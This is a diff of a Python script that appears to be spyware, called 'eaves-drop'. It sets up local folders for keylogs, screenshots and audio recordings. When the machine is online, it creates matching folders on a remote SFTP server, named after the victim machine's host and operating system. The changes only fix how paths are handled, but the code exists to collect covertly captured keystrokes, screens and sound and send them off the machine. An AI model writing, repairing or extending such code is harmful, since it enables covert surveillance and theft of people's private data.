@@ -12,22 +12,21 @@ logging.basicConfig(filename=log_path, level=logging.DEBUG)
 local_dir = Path('/tmp/eaves-drop')
 
 # remote
-remote_dir = Path('/root/{node}-{system}'.format(node=system_info.node, system=system_info.system))
+remote_dir = '/root/{node}-{system}'.format(node=system_info.node, system=system_info.system)
 
 
 # keylogs
+remote_keylogs_dir = 'keylogs'
 local_keylogs_dir = local_dir / 'keylogs'
 local_keylogs_dir.mkdir(0o777, parents=True, exist_ok=True)
-remote_dir = Path('/root/{node}-{system}'.format(node=system_info.node, system=system_info.system))
-remote_keylogs_dir = remote_dir / 'keylogs'
 
 # screenshots
-remote_screenshots_dir = remote_dir / 'screenshots'
+remote_screenshots_dir = 'screenshots'
 local_screenshots_dir = local_dir / 'screenshots'
 local_screenshots_dir.mkdir(0o777, parents=True, exist_ok=True)
 
 # audios
-remote_audios_dir = remote_dir / 'audios'
+remote_audios_dir = 'audios'
 local_audios_dir = local_dir / 'audios'
 local_audios_dir.mkdir(0o777, parents=True, exist_ok=True)
 
@@ -45,17 +44,17 @@ if is_online():
 
     if sftp_server:
 
-        if not sftp_server.isdir(bytes(remote_dir)):
-            sftp_server.mkdir(bytes(remote_dir))
+        if not sftp_server.isdir(remote_dir):
+            sftp_server.mkdir(remote_dir)
 
-        sftp_server.chdir(bytes(remote_dir))
-        if not sftp_server.exists(bytes(remote_screenshots_dir)):
-            sftp_server.mkdir(bytes(remote_screenshots_dir))
+        sftp_server.chdir(remote_dir)
+        if not sftp_server.exists(remote_screenshots_dir):
+            sftp_server.mkdir(remote_screenshots_dir)
 
-        if not sftp_server.isdir(bytes(remote_keylogs_dir)):
-            sftp_server.mkdir(bytes(remote_keylogs_dir))
+        if not sftp_server.isdir(remote_keylogs_dir):
+            sftp_server.mkdir(remote_keylogs_dir)
 
-        if not sftp_server.isdir(bytes(remote_audios_dir)):
-            sftp_server.mkdir(bytes(remote_audios_dir))
+        if not sftp_server.isdir(remote_audios_dir):
+            sftp_server.mkdir(remote_audios_dir)
 
         sftp_server.close()
